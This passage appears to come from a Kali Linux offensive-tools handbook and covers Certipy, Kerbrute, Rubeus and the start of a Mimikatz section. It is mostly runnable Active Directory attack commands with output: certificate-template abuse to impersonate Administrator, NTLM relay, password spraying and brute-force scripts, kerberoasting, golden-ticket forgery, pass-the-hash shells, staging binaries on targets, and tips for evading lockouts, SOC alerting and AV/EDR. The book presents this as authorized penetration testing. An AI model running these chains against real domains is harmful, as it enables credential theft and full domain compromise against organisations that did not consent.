[*] Found 34 certificate templates
[*] Found 1 certificate authority
[*] Saving text output to '20260719_Certipy.txt'
```

**Example 2 – Show only vulnerable templates**
```bash
$ certipy-ad find -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 -vulnerable -stdout
[!] Vulnerabilities
    ESC1 : Template 'VulnTemplate' allows SAN specification by low-priv users
```

**Example 3 – Exploit ESC1 (arbitrary SAN, request cert as Administrator)**
```bash
$ certipy-ad req -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 \
  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

**Example 4 – Authenticate with the forged certificate (PKINIT, get TGT + NT hash)**
```bash
$ certipy-ad auth -pfx administrator.pfx -domain corp.local -dc-ip 10.10.10.10
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

**Example 5 – ESC4: abuse write access to template to make it exploitable, then req**
```bash
$ certipy-ad template -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 \
  -template VulnTemplate2 -save-old
[*] Saved current configuration to 'VulnTemplate2.json'
[*] Updated certificate template 'VulnTemplate2'
```

**Example 6 – ESC8: NTLM relay to AD CS HTTP enrollment endpoint**
```bash
$ certipy-ad relay -ca CORP-CA -template DomainController
[*] Listening on 0.0.0.0:445
[*] Connecting to http://corp-ca.corp.local/certsrv/certfnsh.asp
[*] Authenticated as CORP\\DC01$
[*] Requesting certificate for 'DC01$'
[*] Got certificate, saved to DC01.pfx
```

**Example 7 – Shadow Credentials attack (add key credential, no password needed)**
```bash
$ certipy-ad shadow auth -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 -account victimuser
[*] Adding Key Credential for 'victimuser'
[*] Authenticating as 'victimuser' with certificate
[*] Got hash for 'victimuser@corp.local': aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

**Example 8 – Enumerate and output BloodHound-compatible JSON**
```bash
$ certipy-ad find -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 -bloodhound
[*] Saving BloodHound-compatible data to '20260719_Certipy.zip'
```

**Example 9 – Use recovered certificate hash to pass-the-hash elsewhere**
```bash
$ evil-winrm -i 10.10.10.10 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**Example 10 – ESC9/ESC10: check for weak certificate mapping (no strong mapping enforced)**
```bash
$ certipy-ad find -u j.smith@corp.local -p 'P@ssw0rd123' -dc-ip 10.10.10.10 -vulnerable
[!] ESC9  : Certificate template 'UserTemplate' has weak certificate mapping (no strong mapping enforced on DC)
```

#### 7. Common Use Cases

- Full AD CS enumeration to identify misconfigured CAs and templates (ESC1–ESC16).
- Escalating from a low-privileged domain user to Domain Admin via ESC1/ESC4 template abuse.
- NTLM relay attacks against HTTP-based certificate enrollment endpoints (ESC8).
- Golden Certificate / persistent access using a compromised CA private key (ESC-Root scenarios).
- Shadow Credentials attacks to compromise accounts without knowing/resetting their passwords.
- Extracting NTLM hashes from Kerberos certificates via UnPAC-the-hash for pass-the-hash chains.
- Feeding ESC-edge data into BloodHound for attack path visualization.

#### 8. Automation with Bash

```bash
#!/bin/bash
# certipy-full-audit.sh - enumerate and auto-flag vulnerable ADCS templates

USER="$1"; PASS="$2"; DOMAIN="$3"; DC_IP="$4"

echo "[*] Running full Certipy enumeration"
certipy-ad find -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout \
  | tee certipy_vuln_report.txt

if grep -q "ESC1" certipy_vuln_report.txt; then
  echo "[!] ESC1 detected — attempting automatic exploitation chain"
  TEMPLATE=$(grep -oP "(?<=template ')[^']+" certipy_vuln_report.txt | head -n1)
  certipy-ad req -u "${USER}@${DOMAIN}" -p "$PASS" -dc-ip "$DC_IP" \
    -ca CORP-CA -template "$TEMPLATE" -upn administrator@"$DOMAIN"
fi
```

```bash
#!/bin/bash
# certipy-auth-loop.sh - authenticate with every PFX in a directory, log NT hashes

for pfx in ./certs/*.pfx; do
  echo "[*] Trying $pfx"
  certipy-ad auth -pfx "$pfx" -domain corp.local -dc-ip 10.10.10.10 | tee -a hashes.log
done
```

#### 9. Tips and Best Practices

- Always start with `certipy-ad find -vulnerable` before attempting any exploitation — it tells you exactly which ESC applies.
- Use `-old-bloodhound` / `-bloodhound` output to correlate ADCS findings directly inside your BloodHound graph alongside ACL/session data.
- ESC1 requires the "Client Authentication" EKU and enrollee-supplied-subject enabled — verify both in `find` output before attempting `req`.
- After obtaining a PFX, always run `certipy-ad auth` — this both gets you a TGT (Kerberos) AND, critically, the NT hash via UnPAC-the-hash for pass-the-hash flexibility.
- For ESC8 relay attacks, combine with `ntlmrelayx`-style coercion tools (PetitPotam, PrinterBug, Coercer) to force machine authentication to your relay listener.
- Clean up any Shadow Credential key material you add during testing (`certipy-ad shadow remove`) to avoid leaving persistence artifacts in a client environment.
- Keep Certipy updated — new ESC techniques (ESC11 through ESC16) are actively researched and added to the tool.

#### 10. Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| `KDC_ERR_PREAUTH_FAILED` during `find`/`req` | Wrong credentials or clock skew | Verify creds, sync time with `ntpdate <dc_ip>` |
| `CA not accessible via RPC` | Firewall/RPC dynamic ports blocked | Use `-web` flag to try HTTP enrollment instead, or check port 445/135 access |
| `Access is denied` on `req` | Account lacks Enroll permission on the template | Re-run `find -vulnerable` to confirm actual enrollment rights |
| `auth` fails to get NT hash | PKINIT succeeded but UnPAC not supported by DC (older Windows) | Use `-no-hash` and rely solely on the TGT/ccache for further attacks |
| Relay (ESC8) never receives connections | No coercion triggered, or HTTP enrollment not enabled on CA | Verify with `find`, enable coercion (e.g. PetitPotam) targeting the relay listener |
| `Failed to resolve` domain controller | DNS not pointing to AD | Add `-dc-ip` explicitly, or set `/etc/resolv.conf` to the DC |

#### 11. References

- Certipy GitHub: https://github.com/ly4k/Certipy
- "Certified Pre-Owned" whitepaper (original ESC1–ESC8 research): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- Certipy wiki / abuse cheat sheet: https://github.com/ly4k/Certipy/wiki
- Kali Linux tool listing: https://www.kali.org/tools/certipy/

### 15.4 Kerbrute

#### 1. Tool Introduction

Kerbrute is a fast, Go-based tool for performing Kerberos pre-authentication attacks against Active Directory: username enumeration, password spraying, brute-forcing, and password validation. Its core trick is abusing the Kerberos AS-REQ exchange: when a client requests a TGT for a username that does not exist, the KDC responds with `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN`; if the username exists but the password is wrong, it responds with `KRB5KDC_ERR_PREAUTH_FAILED`. This distinction lets Kerbrute enumerate valid usernames **without generating a single Windows Security Event ID 4625 (failed logon)** on the target — because pre-authentication failures are logged differently (Event ID 4771) and username enumeration via AS-REQ generates far less noise than LDAP/SMB-based enumeration, making it a favored stealthy first step.

#### 2. How to Install

```bash
# Kali Linux (pre-installed in recent releases)
sudo apt update
sudo apt install kerbrute -y

# Verify
kerbrute --version
```

```bash
# Build from source with Go (if not pre-installed / want latest)
sudo apt install golang-go -y
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
# Binaries land in ./dist/
sudo cp dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

```bash
# Or grab a prebuilt release binary directly
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/
```

#### 3. Syntax

```bash
kerbrute <command> [flags]
```

Commands: `bruteuser`, `userenum`, `passwordspray`, `bruteforce`.

#### 4. Command-Line Options

**Global flags (apply to all commands):**

| Flag | Description |
|---|---|
| `-d, --domain` | Target domain name (FQDN) |
| `--dc` | Domain Controller IP/hostname to target directly |
| `-t, --threads` | Number of concurrent threads (default 10) |
| `-o, --output` | Save output to file |
| `--safe` | Safe mode — stop spraying a user after first success to avoid over-attempts |
| `-v, --verbose` | Verbose output, show failed attempts too |
| `--delay` | Delay in milliseconds between requests |
| `-h, --help` | Show help |

**`userenum` subcommand:**
```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist.txt>
```

**`passwordspray` subcommand:**
```bash
kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist.txt> <password>
```

**`bruteforce` subcommand (user:password combo file, 1:1 brute):**
```bash
kerbrute bruteforce -d <domain> --dc <dc_ip> <combofile.txt>
```

**`bruteuser` subcommand (single user, many passwords):**
```bash
kerbrute bruteuser -d <domain> --dc <dc_ip> <passwordlist.txt> <username>
```

#### 5. Basic Usage (Expected Output in Bash)

```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/19/26 - Ronnie Flathers @ropnop

2026/07/19 10:15:22 >  Using KDC(s):
2026/07/19 10:15:22 >   10.10.10.10:88

2026/07/19 10:15:22 >  [+] VALID USERNAME:       j.smith@corp.local
2026/07/19 10:15:22 >  [+] VALID USERNAME:       administrator@corp.local
2026/07/19 10:15:23 >  [+] VALID USERNAME:       svc-sql@corp.local
2026/07/19 10:15:25 >  Done! Tested 5000 usernames (3 valid) in 3.412 seconds
```

#### 6. Practical Examples (with Output)

**Example 1 – Basic username enumeration**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
2026/07/19 10:16:01 >  [+] VALID USERNAME:  helpdesk@corp.local
2026/07/19 10:16:04 >  Done! Tested 10000000 usernames (1 valid) in 210.532 seconds
```

**Example 2 – Enumeration with increased threads for speed**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 -t 100 usernames.txt
2026/07/19 10:20:11 >  [+] VALID USERNAME:  j.smith@corp.local
2026/07/19 10:20:12 >  Done! Tested 5000 usernames (1 valid) in 1.988 seconds
```

**Example 3 – Save results to a file**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 -o valid_users.txt usernames.txt
2026/07/19 10:22:00 >  [+] VALID USERNAME:  administrator@corp.local
2026/07/19 10:22:03 >  Done! Tested 5000 usernames (1 valid) in 2.700 seconds
$ cat valid_users.txt
2026/07/19 10:22:00 >  [+] VALID USERNAME:  administrator@corp.local
```

**Example 4 – Password spray against a validated user list**
```bash
$ kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid_users.txt 'Summer2026!'
2026/07/19 10:25:41 >  [+] VALID LOGIN:  j.smith@corp.local:Summer2026!
2026/07/19 10:25:43 >  Done! Tested 42 logins (1 successes) in 2.103 seconds
```

**Example 5 – Safe-mode spray (stop after first success per user, avoid lockouts)**
```bash
$ kerbrute passwordspray -d corp.local --dc 10.10.10.10 --safe valid_users.txt 'Welcome1!'
2026/07/19 10:28:15 >  [+] VALID LOGIN:  svc-backup@corp.local:Welcome1!
2026/07/19 10:28:16 >  Done! Tested 42 logins (1 successes) in 1.502 seconds
```

**Example 6 – Bruteforce a single user with a small curated password list**
```bash
$ kerbrute bruteuser -d corp.local --dc 10.10.10.10 rockyou-top1000.txt helpdesk
2026/07/19 10:32:09 >  [+] VALID LOGIN:  helpdesk@corp.local:Password1
2026/07/19 10:32:09 >  Done! Tested 1000 passwords (1 success) in 0.877 seconds
```

**Example 7 – Combo brute force (user:pass pairs, e.g. leaked credential list)**
```bash
$ kerbrute bruteforce -d corp.local --dc 10.10.10.10 combos.txt
2026/07/19 10:35:44 >  [+] VALID LOGIN:  m.jones@corp.local:Autumn2025!
2026/07/19 10:35:45 >  Done! Tested 300 combos (1 success) in 1.220 seconds
```

**Example 8 – Verbose mode showing failed attempts too**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 -v small_list.txt
2026/07/19 10:38:00 >  [!] fake.user@corp.local - Doesn't exist
2026/07/19 10:38:00 >  [+] VALID USERNAME:  j.smith@corp.local
2026/07/19 10:38:00 >  [!] admin_test@corp.local - Doesn't exist
```

**Example 9 – Targeting a domain without DNS resolution (raw IP DC)**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 usernames.txt
2026/07/19 10:40:12 >  Using KDC(s):
2026/07/19 10:40:12 >    10.10.10.10:88
```

**Example 10 – Chained spray: enumerate then spray in one pipeline**
```bash
$ kerbrute userenum -d corp.local --dc 10.10.10.10 -o /tmp/users.raw usernames.txt
$ grep VALID /tmp/users.raw | awk '{print $NF}' | cut -d'@' -f1 > valid_users.txt
$ kerbrute passwordspray -d corp.local --dc 10.10.10.10 valid_users.txt 'Winter2026!'
2026/07/19 10:44:50 >  [+] VALID LOGIN:  j.smith@corp.local:Winter2026!
```

#### 7. Common Use Cases

- Stealthy username enumeration during external/internal engagements before any authentication attempts.
- Building an accurate valid-username list to feed into password spraying (Kerbrute or other tools like `crackmapexec`/`netexec`).
- Low-noise password spraying against a known-valid user list to avoid account lockouts and excessive alerting.
- Validating leaked/breached credential combo lists against the live domain.
- OSINT-driven username generation (from LinkedIn/email formats) validated at scale against the KDC.

#### 8. Automation with Bash

```bash
#!/bin/bash
# kerbrute-pipeline.sh - enumerate valid users then spray a single password safely

DOMAIN="corp.local"
DC="10.10.10.10"
USERLIST="usernames.txt"
PASSWORD="$1"

echo "[*] Enumerating valid usernames..."
kerbrute userenum -d "$DOMAIN" --dc "$DC" -o valid_raw.txt "$USERLIST" >/dev/null

grep "VALID USERNAME" valid_raw.txt | awk '{print $NF}' | cut -d'@' -f1 > valid_users.txt
COUNT=$(wc -l < valid_users.txt)
echo "[+] Found $COUNT valid usernames"

echo "[*] Spraying password: $PASSWORD (safe mode)"
kerbrute passwordspray -d "$DOMAIN" --dc "$DC" --safe valid_users.txt "$PASSWORD" | tee spray_results.txt

echo "[+] Done. Successful logins:"
grep "VALID LOGIN" spray_results.txt
```

```bash
#!/bin/bash
# multi-password-spray.sh - spray a list of common seasonal passwords, one per day/run

USERLIST="valid_users.txt"
PASSWORDS=("Summer2026!" "Company123!" "Welcome1" "Password1")

for pw in "${PASSWORDS[@]}"; do
  echo "[*] Spraying: $pw"
  kerbrute passwordspray -d corp.local --dc 10.10.10.10 --safe "$USERLIST" "$pw"
  echo "[*] Sleeping 30 min to avoid lockout policy..."
  sleep 1800
done
```

#### 9. Tips and Best Practices

- Always run `userenum` first to build a validated username list — spraying against unvalidated names wastes attempts and increases lockout risk unnecessarily.
- Check the domain's account lockout policy (threshold, observation window) before spraying; use `--safe` and pace attempts (`--delay`) to stay under the threshold.
- Kerberos pre-auth enumeration is far quieter than LDAP/SMB enumeration but is **not silent** — it still generates Kerberos AS-REQ traffic and can trigger Event ID 4768/4771 monitoring on well-instrumented environments.
- Combine with realistic username-format generation (e.g., `firstname.lastname`, `flastname`) derived from OSINT for higher success rates.
- Space out spray attempts across different days/times to mimic normal failed-login patterns and avoid a spike that triggers SOC alerting.
- Use `--dc` to target the DC directly by IP when DNS isn't configured on your attack host, avoiding resolution failures.

#### 10. Troubleshooting

| Issue | Cause | Fix |
|---|---|---|
| All usernames report invalid | Wrong domain name or DC unreachable on port 88/UDP+TCP | Verify with `nmap -p88 <dc_ip>`, confirm domain spelling matches Kerberos realm |
| `KRB_AP_ERR_SKEW` errors | Clock skew between attacker host and DC | `sudo ntpdate <dc_ip>` or `sudo timedatectl set-ntp true` |
| Extremely slow enumeration | Low thread count on a large list | Increase `-t` (e.g. `-t 50` or `-t 100`), but balance against detection risk |
| No output printed at all | DC not responding / network filtering UDP 88 | Confirm connectivity, try TCP fallback (Kerbrute auto-falls back), check VPN/routing |
| False negatives on known-good accounts | Account is disabled or expired, KDC still responds "doesn't exist"-like | Cross-check via LDAP enumeration (ldapdomaindump/BloodHound) for account status |

#### 11. References

- Kerbrute GitHub: https://github.com/ropnop/kerbrute
- ropnop blog — "Kerberos Pre-Auth Bruteforcing": https://blog.ropnop.com/
- MITRE ATT&CK T1589 / T1110 (mapping to enumeration/brute force techniques): https://attack.mitre.org/
- Kali Linux tool listing: https://www.kali.org/tools/kerbrute/

### 15.5 Rubeus

#### Introduction

Rubeus is a C# toolset built for raw Kerberos interaction and abuse, originally derived from Benjamin Delpy's Kekeo project and developed/maintained by the GhostPack collection (SpecterOps). It is used to perform Kerberoasting, AS-REP roasting, ticket requesting/renewal, overpass-the-hash, pass-the-ticket, ticket harvesting/monitoring, S4U2Self/S4U2Proxy abuse (constrained delegation), Golden/Silver ticket creation support, and Kerberos ticket manipulation on Windows hosts. Rubeus is a **Windows-only** binary (it targets the .NET Framework and Win32 Kerberos APIs), so on Kali Linux it is typically staged onto a compromised Windows host, executed via C2, or run through Wine for testing — it is not natively run against Linux targets. Kali is normally the platform used to *host, compile, or transfer* Rubeus, while the tool itself executes on the Windows target/pivot.

#### Installation

Rubeus does not ship as a native Kali package; it is compiled from source or downloaded as a pre-built binary/DLL and transferred to the target.

**Option 1 – Clone and compile with Kali's Mono/dotnet toolchain (cross-compiling for Windows):**
```bash
sudo apt update
sudo apt install -y mono-complete nuget git
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
nuget restore Rubeus.sln
msbuild Rubeus.sln /p:Configuration=Release /p:Platform=x64
```
The compiled binary will be under `Rubeus/bin/x64/Release/Rubeus.exe`.

**Option 2 – Use a pre-built binary (from a trusted GhostPack release or your own build server):**
```bash
wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe -O Rubeus.exe
```

**Option 3 – Use it via a C2 framework's built-in execute-assembly (Cobalt Strike, Sliver, Covenant, Mythic):**
```
execute-assembly /root/tools/Rubeus.exe kerberoast
```

**Serve the binary from Kali for retrieval on the Windows host:**
```bash
python3 -m http.server 8000
```
Then, on the Windows target (PowerShell):
```powershell
Invoke-WebRequest -Uri http://<kali-ip>:8000/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe
```

#### Syntax

```
Rubeus.exe <action> [options]
```
Rubeus is invoked as a single executable with a mandatory **action** verb (e.g., `kerberoast`, `asreproast`, `tgtdeleg`, `s4u`, `ptt`, `renew`, `harvest`, `dump`, `monitor`, `golden`, `silver`, `hash`, `describe`, `triage`, `klist`, `purge`, `createnetonly`, `changepw`, `asktgt`, `asktgs`), followed by action-specific flags in `/flag:value` form.

#### Command-line Options

| Action | Purpose |
|---|---|
| `asktgt` | Request a TGT using a password, hash, certificate, or key |
| `asktgs` | Request a service ticket (TGS) using an existing TGT |
| `renew` | Renew an existing TGT |
| `s4u` | Perform S4U2Self / S4U2Proxy abuse (constrained delegation) |
| `kerberoast` | Request TGS tickets for SPN accounts and output crackable hashes |
| `asreproast` | Request AS-REP for accounts with pre-auth disabled |
| `harvest` | Continuously harvest TGTs from memory/LSASS at intervals |
| `monitor` | Monitor for and dump 4624 logon events / new TGTs |
| `dump` | Dump Kerberos tickets from LSASS (current or all users) |
| `ptt` | Pass-the-ticket — inject a `.kirbi` ticket into the current logon session |
| `purge` | Purge all tickets from the current logon session |
| `klist` | List Kerberos tickets in the current session (like native klist) |
| `describe` | Parse and display the contents of a ticket file |
| `golden` | Build a Golden Ticket (requires krbtgt hash) |
| `silver` | Build a Silver Ticket (requires service account hash) |
| `changepw` | Change a user's password using a TGT |
| `hash` | Calculate RC4/AES Kerberos keys from a plaintext password |
| `createnetonly` | Spawn a hidden process with a "network-only" logon (for pass-the-hash chains) |
| `tgtdeleg` | Abuse the TGT delegation trick to request a TGT with no elevated rights |
| `triage` | Summarize tickets currently in memory |

**Common global/action flags:**

| Flag | Description |
|---|---|
| `/user:<user>` | Target username |
| `/password:<pass>` | Plaintext password |
| `/rc4:<hash>` | NTLM/RC4 hash for the account |
| `/aes128:<key>` / `/aes256:<key>` | AES Kerberos keys |
| `/domain:<domain>` | Target domain FQDN |
| `/dc:<dc-fqdn>` | Specific domain controller to target |
| `/spn:<spn>` | Target SPN for `kerberoast`/`asktgs` |
| `/outfile:<path>` | Write ticket/output to a file |
| `/ticket:<base64\|file>` | Ticket to inject (`ptt`) or describe |
| `/nowrap` | Don't line-wrap base64 ticket output (easier to copy) |
| `/format:<ccache\|kirbi>` | Output ticket format |
| `/creduser:<domain\user>` | Alternate creds for the request |
| `/credpassword:<pass>` | Password for `/creduser` |
| `/simple` | Simplified kerberoast output (hash only, less metadata) |
| `/stats` | Show account statistics with `kerberoast` (e.g., PowerView-style enum) |
| `/ldapfilter:<filter>` | Custom LDAP filter for target selection |
| `/user:<user> /impersonateuser:<user>` | S4U2Self target for impersonation |
| `/msdsspn:<spn>` | Target SPN for S4U2Proxy |
| `/altservice:<spn>` | Alternate service name for ticket swap in S4U |
| `/opsec` | Use OPSEC-safer ticket requests (AES, avoid weird encryption downgrades) |
| `/nopreauth` | Skip pre-authentication (AS-REP roasting) |
| `/interval:<seconds>` | Polling interval for `harvest`/`monitor` |
| `/consoleoutfile:<path>` | Mirror console output to a file |

#### Basic Usage (expected output in bash)

Kerberoasting a full domain with the current logon session's credentials, executed via a shell on the compromised Windows host but shown from a Kali-driven C2 console:
```bash
$ ./Rubeus.exe kerberoast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be less reliable to crack, consider using /rc4opsec
[*] Target Domain: corp.local
[*] Searching path 'LDAP://DC01.corp.local/DC=corp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!(objectCategory=computer)))'

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,OU=ServiceAccounts,DC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/sql01.corp.local:1433
[*] Hash                   : $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local~1433*$a1b2c3...
```

#### Practical Examples with Output

**1. AS-REP roasting all users with pre-auth disabled:**
```bash
$ ./Rubeus.exe asreproast /format:hashcat /nowrap
[*] Action: AS-REP roasting
[*] Target Domain: corp.local
[*] SamAccountName         : jdoe
[*] DistinguishedName      : CN=John Doe,OU=Users,DC=corp,DC=local
[*] Hash                   : $krb5asrep$23$jdoe@CORP.LOCAL:9f8e7d...
```

**2. Requesting a TGT using an NTLM hash (overpass-the-hash):**
```bash
$ ./Rubeus.exe asktgt /user:jdoe /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local /ptt
[*] Action: Ask TGT
[*] Using rc4_hmac hash: 8846f7eaee8fb117ad06bdd830b7586c
[*] Building AS-REQ (w/ preauth) for: 'corp.local\jdoe'
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIFvjCCBbqgAwIBBaEDAgEWooIE...
[+] Ticket successfully imported!
```

**3. Requesting a TGS for a specific SPN:**
```bash
$ ./Rubeus.exe asktgs /ticket:doIFvjCC... /service:CIFS/fs01.corp.local /ptt
[*] Action: Ask TGS
[*] Using domain controller: DC01.corp.local (10.10.10.1)
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[+] TGS request successful!
[+] Ticket successfully imported!
```

**4. Pass-the-ticket from a saved .kirbi file:**
```bash
$ ./Rubeus.exe ptt /ticket:C:\Temp\jdoe.kirbi
[*] Action: Import Ticket
[+] Ticket successfully imported!
```

**5. Listing tickets currently in the session:**
```bash
$ ./Rubeus.exe klist
[*] Action: List Kerberos Tickets (Current User)
[*] Current LUID    : 0x3e7

  UserName                 : jdoe @ CORP.LOCAL
  Service                  : krbtgt/CORP.LOCAL @ CORP.LOCAL
  Target                   : krbtgt/CORP.LOCAL @ CORP.LOCAL
  EndTime                  : 8/1/2026 4:12:07 PM
  RenewTill                : 8/8/2026 4:12:07 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
```

**6. Constrained delegation abuse (S4U2Self/S4U2Proxy):**
```bash
$ ./Rubeus.exe s4u /user:websvc /rc4:1a2b3c... /impersonateuser:administrator /msdsspn:cifs/fs01.corp.local /ptt
[*] Action: S4U
[*] Using rc4_hmac hash: 1a2b3c...
[*] Building S4U2self request for: 'websvc@CORP.LOCAL'
[+] S4U2self success!
[*] Impersonating user 'administrator' to target SPN 'cifs/fs01.corp.local'
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

**7. Building a Golden Ticket:**
```bash
$ ./Rubeus.exe golden /rc4:krbtgt_hash_here /domain:corp.local /sid:S-1-5-21-1111-2222-3333 /user:fakeadmin /ptt
[*] Action: Build TGT

  * SID: S-1-5-21-1111-2222-3333
  * UserId: 500
  * Groups: 513, 512, 520, 518, 519
  * ServiceKey: <krbtgt rc4>
  * Domain: corp.local

[+] Ticket successfully imported!
```

**8. Harvesting TGTs at an interval (post-compromise monitoring):**
```bash
$ ./Rubeus.exe harvest /interval:30
[*] Action: TGT Harvesting (loop for new/renewed TGTs)
[*] Monitoring every 30 seconds for new TGTs
[+] 7/19/2026 3:02:11 PM UTC - Found new TGT:
    User : CORP\svc_backup
```

**9. Renewing an existing TGT:**
```bash
$ ./Rubeus.exe renew /ticket:doIFvjCC... /ptt
[*] Action: Renew Ticket
[+] Ticket renewed!
[+] Ticket successfully imported!
```

#### Common Use Cases

- Kerberoasting service accounts for offline cracking with hashcat/John.
- AS-REP roasting accounts with `DONT_REQ_PREAUTH` set.
- Overpass-the-hash to convert an NTLM hash into a usable Kerberos TGT.
- Pass-the-ticket lateral movement across hosts sharing a domain.
- Abusing constrained/unconstrained delegation for privilege escalation.
- Building Golden/Silver tickets after obtaining the krbtgt or service account hash for persistence.
- Harvesting and monitoring for privileged tickets during long engagements.

#### Automation with Bash

Kali is typically the orchestration point even though Rubeus executes on Windows; a bash wrapper can automate delivery + hashcat cracking of results retrieved back to Kali:
```bash
#!/bin/bash
# rubeus_kerberoast_pipeline.sh
TARGET_IP="10.10.10.50"
KALI_IP="10.10.10.5"

echo "[*] Serving Rubeus.exe..."
python3 -m http.server 8000 &
SERVER_PID=$!

echo "[*] Waiting for operator to trigger download+execute on target via C2..."
read -p "Press enter once Rubeus kerberoast output has been saved to hashes.txt: "

kill $SERVER_PID

echo "[*] Cracking with hashcat..."
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt

echo "[*] Cracked credentials:"
cat cracked.txt
```

#### Tips and Best Practices

- Prefer `/opsec` and AES-based requests over RC4 where possible; RC4 TGS requests for kerberoasting are a well-known detection signature (Event ID 4769 with encryption type `0x17`).
- Use `/simple` output when scripting hash extraction to avoid parsing extra metadata.
- Always clean up injected tickets with `purge` when finished on a shared/interactive host to reduce forensic footprint.
- Combine with PowerView/BloodHound output to target only accounts with SPNs set on privileged users, rather than kerberoasting the entire domain (noisy and often low-value).
- Store harvested `.kirbi` tickets off-host quickly; LSASS-resident tickets can be cleared by logoff/reboot.

#### Troubleshooting

- **`KDC_ERR_PREAUTH_FAILED`**: wrong password/hash, or the account requires pre-auth (AS-REP roasting doesn't apply).
- **`KRB-ERR-RESPONSE-TOO-BIG` / connection errors**: ensure UDP/TCP 88 is reachable to the DC; use `/dc:<fqdn>` explicitly rather than relying on DNS discovery.
- **Empty kerberoast results**: confirm the requesting account has read rights to `servicePrincipalName` attributes (usually true for any authenticated user) and that `/ldapfilter` isn't overly restrictive.
- **`ptt` succeeds but access still denied**: verify the ticket's target SPN actually matches the resource being accessed, and that the ticket hasn't expired.
- **AV/EDR flags Rubeus.exe**: use `execute-assembly` from a C2 to run in-memory rather than dropping the binary to disk, or obfuscate/rename the assembly.

#### References

- GhostPack Rubeus repository: https://github.com/GhostPack/Rubeus
- HackTricks – Kerberoast: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- Microsoft Kerberos protocol documentation: https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview
- SpecterOps blog on Kerberos abuse and delegation

### 15.6 Mimikatz

Mimikatz is one of the most widely used post-exploitation credential-access tools in the Windows security ecosystem. Originally created by Benjamin Delpy (gentilkiwi) as a proof-of-concept to demonstrate flaws in Microsoft's authentication implementations, it has since become a staple tool in penetration testing, red teaming, and Active Directory security assessments. Mimikatz is capable of extracting plaintext passwords, password hashes, PIN codes, and Kerberos tickets directly from memory (LSASS process), as well as performing attacks such as Pass-the-Hash, Pass-the-Ticket, Over-Pass-the-Hash, and Golden/Silver Ticket forgery. On Kali Linux, Mimikatz itself is a native Windows binary (written in C, compiled for Windows), so it is typically staged and executed against a compromised Windows target rather than run natively on the Linux attack box. However, Kali provides several supporting tools and a Linux-compatible implementation path so operators can prepare, deliver, and interact with Mimikatz output as part of a broader engagement workflow.

This chapter explains what Mimikatz does, how to obtain and stage it from Kali Linux, its command syntax and options, and how to use it effectively during an authorized penetration test.

#### 15.6.1 Introduction

Mimikatz was designed to interact directly with the Windows Local Security Authority Subsystem Service (LSASS), the process responsible for enforcing security policy and storing credential material in memory after a user authenticates. Because Windows caches credentials in memory to support Single Sign-On (SSO), Mimikatz can read this memory space (with sufficient privileges) and extract secrets such as:

- Cleartext passwords (on older/unpatched systems, or when WDigest is enabled)
- NTLM password hashes
- Kerberos tickets (TGTs and service tickets)
- Cached domain credentials
